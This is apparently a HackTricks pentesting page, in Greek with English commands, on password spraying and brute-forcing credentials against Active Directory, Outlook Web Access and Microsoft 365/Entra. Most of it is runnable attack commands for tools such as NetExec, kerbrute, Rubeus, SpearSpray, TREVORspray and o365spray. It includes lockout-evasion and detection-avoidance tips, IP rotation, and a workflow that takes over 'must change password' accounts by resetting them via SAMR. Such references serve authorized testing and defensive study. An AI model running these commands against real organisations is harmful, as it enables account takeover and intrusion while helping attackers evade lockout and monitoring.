# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Μόλις εντοπίσετε αρκετά **valid usernames**, μπορείτε να δοκιμάσετε τους πιο **συνηθισμένους κωδικούς πρόσβασης** (έχοντας υπόψη την **password policy** του περιβάλλοντος) με καθέναν από τους χρήστες που εντοπίστηκαν.\
Από **προεπιλογή**, το **ελάχιστο** **μήκος** **κωδικού πρόσβασης** είναι **7**.

Οι λίστες με συνηθισμένα usernames μπορεί επίσης να φανούν χρήσιμες: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Σημειώστε ότι **ενδέχεται να κλειδώσετε ορισμένους λογαριασμούς αν δοκιμάσετε αρκετούς λανθασμένους κωδικούς πρόσβασης** (από προεπιλογή, περισσότερους από 10).

### Λήψη password policy

Αν έχετε credentials κάποιου χρήστη ή shell ως domain user, μπορείτε να **λάβετε την password policy με**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Εκμετάλλευση από Linux (ή όλα)

- Χρήση του **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Χρήση του **NetExec (CME successor)** για στοχευμένο spraying χαμηλού θορύβου μέσω SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Χρησιμοποιώντας το [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(μπορείτε να καθορίσετε τον αριθμό των προσπαθειών για την αποφυγή κλειδωμάτων):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Χρήση του [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - **ΔΕΝ ΣΥΝΙΣΤΑΤΑΙ, ΜΕΡΙΚΕΣ ΦΟΡΕΣ ΔΕΝ ΛΕΙΤΟΥΡΓΕΙ**<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Με το module `scanner/smb/smb_login` του **Metasploit**:

![Password Spraying - Brute-Force: Με το module scanner/smb/smb login του Metasploit](<../../images/image (745).png>)

- Με τη χρήση του **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Από Windows

- Με το [Rubeus](https://github.com/Zer1t0/Rubeus) version με brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Με το [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Από προεπιλογή μπορεί να δημιουργήσει users από το domain και θα λάβει το password policy από το domain, περιορίζοντας τις προσπάθειες σύμφωνα με αυτό):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Με το [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identify and Take Over "Password must change at next logon" Accounts (SAMR)

Μια low-noise τεχνική είναι να κάνετε spray έναν benign/κενό κωδικό πρόσβασης και να εντοπίζετε accounts που επιστρέφουν STATUS_PASSWORD_MUST_CHANGE, γεγονός που υποδεικνύει ότι ο κωδικός πρόσβασης έληξε υποχρεωτικά και μπορεί να αλλάξει χωρίς να γνωρίζετε τον παλιό.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- Κάντε enumerate τους χρήστες (RID brute μέσω SAMR) για να δημιουργήσετε τη λίστα στόχων:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Κάντε spray με κενό password και συνεχίστε μετά από hits για να εντοπίσετε accounts που πρέπει να αλλάξουν password στο επόμενο logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Για κάθε εύρημα, αλλάξτε τον κωδικό πρόσβασης μέσω SAMR με το module του NetExec (δεν απαιτείται ο παλιός κωδικός πρόσβασης όταν έχει οριστεί το "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operational notes:
- Βεβαιωθείτε ότι το ρολόι του host σας είναι συγχρονισμένο με το DC πριν από Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
- Ένα [+] χωρίς (Pwn3d!) σε ορισμένα modules (π.χ. RDP/WinRM) σημαίνει ότι τα creds είναι έγκυρα, αλλά ο λογαριασμός δεν διαθέτει δικαιώματα interactive logon.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Password spraying pre-auth με Kerberos, στόχευση μέσω LDAP και throttling με επίγνωση PSO (SpearSpray)

Το spraying βασισμένο σε Kerberos pre-auth μειώνει τον θόρυβο σε σύγκριση με προσπάθειες SMB/NTLM/LDAP bind και ευθυγραμμίζεται καλύτερα με τις πολιτικές lockout του AD. Το SpearSpray συνδυάζει στόχευση μέσω LDAP, pattern engine και επίγνωση πολιτικών (domain policy + PSOs + buffer badPwdCount), ώστε να εκτελεί spraying με ακρίβεια και ασφάλεια. Μπορεί επίσης να επισημαίνει compromised principals στο Neo4j για BloodHound pathing.<sup>[[1]](#references)</sup>

Βασικές ιδέες:
- Ανακάλυψη χρηστών μέσω LDAP με paging και υποστήριξη LDAPS, προαιρετικά με custom LDAP filters.
- Φιλτράρισμα με επίγνωση του domain lockout policy + PSO, ώστε να διατηρείται ρυθμιζόμενο buffer προσπαθειών (threshold) και να αποφεύγεται το locking των χρηστών.
- Επικύρωση μέσω Kerberos pre-auth με fast gssapi bindings (παράγει 4768/4771 στους DCs αντί για 4625).
- Password generation ανά χρήστη βάσει patterns, με χρήση μεταβλητών όπως ονόματα και temporal values που προκύπτουν από το pwdLastSet κάθε χρήστη.
- Έλεγχος throughput με threads, jitter και μέγιστο αριθμό requests ανά δευτερόλεπτο.
- Προαιρετική ενσωμάτωση με Neo4j για την επισήμανση owned users στο BloodHound.

Βασική χρήση και discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Στόχευση και έλεγχος μοτίβων:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Έλεγχοι stealth και ασφάλειας:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Εμπλουτισμός Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Επισκόπηση του συστήματος patterns (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Διαθέσιμες μεταβλητές:
- {name}, {samaccountname}
- Χρονικά δεδομένα από το pwdLastSet (ή το whenCreated) κάθε χρήστη: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Βοηθητικά σύνθεσης και org token: {separator}, {suffix}, {extra}

Λειτουργικές σημειώσεις:

- Προτιμήστε την αναζήτηση στο PDC-emulator με -dc, ώστε να διαβάζετε τα πιο αξιόπιστα badPwdCount και policy-related στοιχεία.
- Τα badPwdCount resets ενεργοποιούνται στην επόμενη προσπάθεια μετά το observation window· χρησιμοποιήστε threshold και timing για να παραμείνετε ασφαλείς.
- Οι προσπάθειες Kerberos pre-auth εμφανίζονται στα DC telemetry ως 4768/4771· χρησιμοποιήστε jitter και rate-limiting για να ενσωματώνονται στην κανονική δραστηριότητα.

> Συμβουλή: Το προεπιλεγμένο LDAP page size του SpearSpray είναι 200· προσαρμόστε το με -lps, όπως απαιτείται.

## Outlook Web Access

Υπάρχουν πολλά εργαλεία για **password spraying outlook**.

- Με το [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Με το [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Με το [Ruler](https://github.com/sensepost/ruler) (αξιόπιστο!)<sup>[[5]](#references)</sup>
- Με το [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Με το [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε μια λίστα χρηστών και έναν κωδικό πρόσβασης ή μια μικρή λίστα κωδικών πρόσβασης για spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Για cloud spraying, εντόπισε πρώτα αν το tenant είναι **managed**, **federated** ή **hybrid**, επειδή το endpoint και η συμπεριφορά του lockout μπορεί να διαφέρουν από το on-prem AD. Στο Microsoft Entra, το **Smart Lockout** αλλάζει τον τρόπο με τον οποίο οι επαναλαμβανόμενες εικασίες καταναλώνουν το lockout budget:<sup>[[7]](#references)</sup>

- Η επανάληψη του **ίδιου λανθασμένου password** δεν συνεχίζει να αυξάνει τον lockout counter, αλλά η δοκιμή **νέων υποψηφίων** τον αυξάνει.
- Οι **familiar** και **unfamiliar** τοποθεσίες έχουν **ξεχωριστούς** counters.
- Τα tenants που χρησιμοποιούν **pass-through authentication (PTA)** δεν επωφελούνται από το bad-password hash tracking, επομένως να τα αντιμετωπίζεις περισσότερο ως κλασικούς lockout-sensitive στόχους.

Στην πράξη, κάνε spray **ενός password ανά round**, κράτα αρκετή απόσταση μεταξύ των rounds και προτίμησε tooling που μπορεί να εντοπίσει το πραγματικό auth flow του tenant πριν στείλει guesses.

- Με το [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), μπορείς να κάνεις recon στο tenant, να εντοπίσεις το `token_endpoint`, να κάνεις spray σε `msol`/`adfs`/`owa`/`okta` και να κατανέμεις την κίνηση μέσω πολλαπλών egress IPs:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Με το [**Spray365**](https://github.com/MarkoH17/Spray365), μπορείτε να δημιουργήσετε εκ των προτέρων ένα resumable **σχέδιο εκτέλεσης**, να τυχαιοποιήσετε τη σειρά του auth και να επιβάλετε μια **ελάχιστη καθυστέρηση ανά user**, ώστε να παραμένετε εκτός του παραθύρου lockout:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Με το [**o365spray**](https://github.com/0xZDH/o365spray), μπορείτε να κάνετε validate το tenant, να κάνετε enumerate users με modules όπως το `onedrive` και να κάνετε spray μέσω `oauth2` ή `adfs`, διατηρώντας **μία προσπάθεια ανά user** σε κάθε lockout window. Αν έχετε ήδη ένα FireProx API, περάστε το με `--proxy-url` για να κατανείμετε τις source IPs:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Η πρόσφατη **tradecraft των operators** έχει επίσης στραφεί προς το **distributed cloud spraying**. Το [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) υποστηρίζει χρονικά παράθυρα, ανακάτεμα κωδικών πρόσβασης, spraying σε ADFS/M365 και αυτόματο exfiltration μετά το authentication. Πρόσφατη κατάχρηση σε πραγματικές συνθήκες χρησιμοποίησε επίσης **Microsoft Teams API** για enumeration λογαριασμών και **AWS region rotation**, ώστε να διανέμει τα κύματα spraying σε πολλαπλές γεωγραφικές περιοχές προέλευσης.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Αναφορές

- [1] [SpearSpray – Βελτιώστε το Active Directory Password Spraying με User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing με Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – Εργαλείο Password Spraying για Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying στο Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying και άλλα ενδιαφέροντα με το RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Οι επιτιθέμενοι εξαπολύουν το TeamFiltration: Campaign κατάληψης λογαριασμών](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: από spray σε gMSA και έπειτα σε DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
